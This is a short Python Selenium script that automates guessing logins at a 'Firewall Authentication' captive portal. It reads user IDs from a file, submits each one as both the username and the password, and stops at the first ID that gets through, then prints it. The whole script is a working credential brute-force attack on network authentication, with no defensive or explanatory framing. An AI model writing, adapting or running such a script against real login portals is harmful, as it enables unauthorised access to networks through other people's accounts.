from selenium import webdriver

browser=webdriver.Chrome("./chromedriver")



F=open("accessible","r")
count=1
i=1
line1=""
while count==1:
	
	browser.get("http://www.yahoo.com")
	if(browser.title!="Firewall Authentication"):
		browser.execute_script("window.history.go(-1)")
		break
	query1=browser.find_element_by_name("username")
	line1=F.readline()

	if(line1==''):
		print("No matching ID")
		break
	query1.send_keys(line1[0:9]+"\t"+line1[0:9]+"\n")
	i+=1

F.close()		
print(line1)
